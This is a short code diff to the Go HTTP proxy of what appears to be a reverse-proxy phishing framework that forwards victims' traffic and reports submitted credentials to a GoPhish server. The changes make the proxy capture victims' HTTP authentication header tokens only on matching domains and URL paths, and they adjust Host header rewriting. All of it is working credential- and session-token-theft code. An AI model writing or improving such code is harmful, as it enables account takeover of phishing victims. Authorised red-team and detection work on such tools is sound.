@@ -604,7 +604,7 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 				}
 
 				// replace "Host" header
-				if r_host, ok := p.replaceHostWithOriginal(req.Host); ok {
+				if r_host, ok := p.replaceHostWithOriginal(o_host); ok {
 					req.Host = r_host
 				}
 
@@ -1023,9 +1023,11 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 					// capture http header tokens
 					for k, v := range pl.httpAuthTokens {
 						if _, ok := s.HttpTokens[k]; !ok {
-							hv := resp.Request.Header.Get(v.header)
-							if hv != "" {
-								s.HttpTokens[k] = hv
+							if req_hostname == v.domain && v.path.MatchString(resp.Request.URL.Path) {
+								hv := resp.Request.Header.Get(v.header)
+								if hv != "" {
+									s.HttpTokens[k] = hv
+								}
 							}
 						}
 					}
@@ -1206,7 +1208,7 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 								rid, ok := s.Params["rid"]
 								if ok && rid != "" {
 									p.gophish.Setup(p.cfg.GetGoPhishAdminUrl(), p.cfg.GetGoPhishApiKey(), p.cfg.GetGoPhishInsecureTLS(), p.cfg.GetGoPhishSessions())
-									err = p.gophish.ReportCredentialsSubmitted(rid, s, p.cfg.GetGoPhishSessions())
+								err = p.gophish.ReportCredentialsSubmitted(rid, s, p.cfg.GetGoPhishSessions())
 									if err != nil {
 										log.Error("gophish: %s", err)
 									}
